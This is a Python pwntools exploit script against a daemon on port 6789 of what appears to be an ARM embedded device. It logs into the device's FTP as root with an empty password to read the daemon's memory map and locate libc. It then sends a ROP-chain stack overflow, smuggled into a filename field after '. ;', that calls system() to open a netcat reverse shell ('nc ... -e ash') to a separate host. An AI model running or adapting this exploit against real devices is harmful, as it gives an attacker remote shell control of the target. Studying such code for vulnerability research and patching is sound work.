#########################################################
# Script for triggering and exploiting a stack overflow #
# via port 6789 hosted by daemon process                #
#########################################################

import struct
import socket
from pwn import *
import time
import re
from ftplib import FTP

# Extracts addresses from given maps file
def extract_addresses(file_path, library_name):
    addresses = []

    with open(file_path, 'r') as maps_file:
        for line in maps_file:
            match = re.search(r'(\w+)-(\w+).+{}\b'.format(re.escape(library_name)), line)
            if match:
                start_address, end_address = match.groups()
                addresses.append((int(start_address, 16), int(end_address, 16)))

    return addresses


# log on to FTP and extract maps file for daemon for the libc base
def fetch_maps_file_via_FTP(path):
    # Replace these with your FTP server details
    ftp_server = '192.168.10.1'
    ftp_username = 'root'
    ftp_password = ''
    daemon_pid = 425 # usually 425

    # Create an FTP object and connect
    info("Logging into FTP server...")
    ftp = FTP()
    ftp.connect(ftp_server)

    # Log in to the FTP server
    ftp.login(ftp_username, ftp_password)

    # Download the file
    with open(path, 'wb') as local_file:
        ftp.retrbinary(f"RETR /proc/{daemon_pid}/maps", local_file.write)

    # Close the FTP connection
    ftp.quit()

    info(f"/proc/{daemon_pid}/maps downloaded...")


# Builds the payload using the libc base
def build_payload(libc_base):
    # Get function addresses we need from libc base
    system_libc = libc_base + 0x4b4fc # 0x4b4fc
    exit_libc = libc_base + 0x46c30 # 0x46c30
    info(f"Located addresses:\nsystem(): {hex(system_libc)}\nexit(): {hex(exit_libc)}")

    # Do the stack overflow and execute arbitrary command
    payload = b'\x41' * 268 # pad until pc overwritten
    payload += p32(libc_base + 0x4a5e0) # pc

    # | 0x5a5e0 | ldmia sp!,{r3,pc} |
    payload += p32(libc_base + 0x313f8) # r3 - copy r2 into r0
    payload += p32(libc_base + 0x32c24) # pc

    # | 0x42c24 | add r2,sp,#0x3c | blx r3 |

    # | 0x413f8 | cpy r0,r2 | ldmia sp!,{r4,pc} |
    payload += p32(0xdeadbeef) # r4
    payload += p32(system_libc) # pc
    payload += b"Aa0Aa1Aa" # padding
    payload += p32(libc_base + 0x184f4) # pc

    # | 0x284f4 | mov r0,#0x1 | ldmia sp!,{r4,pc} |
    payload += p32(0xdeadbeef) # r4
    payload += p32(exit_libc) # pc

    payload += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab" # padding
    payload += b"nc 192.168.10.20 123 -e ash #" # command to execute as system

    return payload


# Builds string + length part of payload
def create_str_and_len_bytestring(incoming_bytes):
    length = len(incoming_bytes)
    return struct.pack('<H', length) + incoming_bytes


# Builds packet daemon can understand
def build_daemon_packet(filename_1, filename_2):
    payload = create_str_and_len_bytestring(filename_1) + create_str_and_len_bytestring(filename_2)

    # Calculate and pack the checksum as an unsigned short (2 bytes)
    checksum_bytes = sum(payload).to_bytes(2, byteorder='little')

    # Combine the payload and checksum
    daemon_packet = b'\x03\x00' + payload + checksum_bytes
    daemon_packet = len(daemon_packet).to_bytes(2, byteorder='little') + daemon_packet

    return daemon_packet


# configure pwntools stuff
context.arch = 'arm'
context.endian = 'little'  # Specify the endianness

# Get maps file for daemon process
maps_file_path = 'daemon_maps'
fetch_maps_file_via_FTP(maps_file_path)

# Get libc base from extracted maps file
addresses = extract_addresses(maps_file_path, '/lib/libuClibc-0.9.33.2.so')
libc_base = addresses[0][0] # start address of first

# Now build the payload we will send as our second string
payload = build_payload(libc_base)

# Create the daemon packet
filename = b"."
filename_2_payload = b". ; " + payload
daemon_packet = build_daemon_packet(filename, filename_2_payload)

# Now send the packet
info(f"Sending payload packet: \n{hexdump(daemon_packet)}")

# Create a TCP socket and connect to daemon
tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_socket.connect(("192.168.10.1", 6789))
info("Connected to daemon...")

# Send the packet
tcp_socket.send(daemon_packet)
info("Payload sent!")

# Optionally, you can wait for a response here if the server is expected to send one.
response = tcp_socket.recv(1024)
info(f"Received response: {response.decode()}")
print()

# Close the socket when done
tcp_socket.close()

info("All done!")